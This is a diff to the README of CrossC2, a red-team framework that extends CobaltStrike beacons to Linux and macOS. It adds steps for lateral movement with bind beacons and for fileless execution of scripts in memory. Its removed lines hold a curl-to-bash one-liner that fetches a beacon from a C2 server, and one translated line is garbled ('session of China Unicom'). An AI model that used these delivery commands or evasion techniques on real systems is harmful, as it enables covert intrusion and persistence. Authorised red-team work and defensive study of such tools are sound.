@@ -10,7 +10,9 @@
 
 🔥 Custom communication protocol [GO📖](https://gloxec.github.io/CrossC2/en/protocol/)
 
-🔥 Now supports lateral movement [GO📌](#Lateral movement: Usage)
+🔥 Now supports lateral movement [GO📌](#Lateral-movement:-Usage)
+
+🔥 Now supports loading scripts from memory [GO📌](#Run script-in-memory)
 
 🎉 **Android** & **iPhone** support [GO📌](#Mobile)
 
@@ -53,7 +55,7 @@ A security framework for enterprises and Red Team personnel, supports CobaltStri
 | gen beacon (mips[el]) |  |  |  |  |  | ⍻ |
 
 Restricted description:
-* CobaltStrike: currently only supports the last version of cs 3.14(bug fixs).
+* CobaltStrike: currently only supports the last version of cs 3.14(bug fixs) and 4.x versions are supported (see the cs4.1 branch for details).
 * Linux: For particularly old systems, you can choose "Linux-GLIBC" option in cna (around 2010)
 * MacOS: Latest systems only support 64-bit programs
 * iOS: sandbox, restricted cmd
@@ -112,35 +114,27 @@ The type of output information can be freely specified at the time of execution.
 
 Can more easily realize C2Profile configuration and custom communication protocol TCP / UDP and so on.
 
-## Lateral movement: Usage [📖 Wiki]()
+## Lateral movement
 
-1. 生成 `Linux-bind` / `MacOS-bind` 类型的beacon
-2. 内网中的目标运行 `./MacOS-bind.beacon <port>` 开启服务
-3. 在网络联通的session中运行 `connect <targetIP>:<port>`
+1. Generate beacon of `Linux-bind` / `MacOS-bind` type
+2. The target in the intranet runs `./MacOS-bind.beacon <port>` to start the service
+3. Run `connect <targetIP>:<port>` in the session of China Unicom
 
 
-## cna plugin way
+## Run script in memory
 
-```
-Menu Bar: CrossC2 -> CrossC2 Payload Generator -> genCrossC2
+The script interpreter such as **bash** / **python** / **ruby** / **perl** / **php** in the host can be called directly in the session to execute the script passed into the memory.
+`There is no information in the process, all running content is transferred from the memory to the interpreter`
+1. python c:\getsysteminfo.py
+2. python import base64;print base64.b64encode('whoami'); print 'a'*40
+3. php <?php phpinfo()?>
 
-Can be configured in the pop-up dialog:
-1. Select beacon_key (the path cannot contain spaces, the problem is not solved yet)
-2. A dynamic library of custom communication protocols that needs to be bound to beacon
-3. Payload type (Staged generated shellcode requires stagerServer)
-```
+Try to load local script:
+![](media/15901534124389/16041501958652.jpg)
 
-![](media/15901534124389/15901617930412.jpg)
+Try to run the scripting language directly:
+![](media/15901534124389/16041502298949.jpg)
 
-The information status will be prompted in the **event** interface during generation
-
-```
-05/01 23:31:03 *** /mnt/cc2/genCrossC2.MacOS 172.16.251.1 5555 /tmp/beacon_keys null MacOS x64 /tmp/CrossC2-test
-05/01 23:31:06 *** genCrossC2 beacon -> *[success] :	Packed 1532232 byte.
-05/01 23:31:07 *** hook hosted CrossC2 beacon MacOS x64 @ http://172.16.251.1:55413/iqEBVKwHoZ
-05/01 23:31:07 *** hook hosted Script Unix Web Delivery (curl) @ http://172.16.251.1:55413/a
-05/01 23:31:07 *** CrossC2 MacOS x64:   curl -A o -o- -L http://172.16.251.1:55413/a | bash -s
-```
 
 
 # Coming soon
@@ -179,6 +173,11 @@ Develop dynamic libraries and customize data return types, such as implementing 
 
 
 # ChangeLog
+
+## release v2.1 :
+
+* +support Support for parsing and executing scripts from memory
+* +support Support CobaltStrike 4.1 (see cs4.1 branch for details)
 
 ## release v2.0 :
 
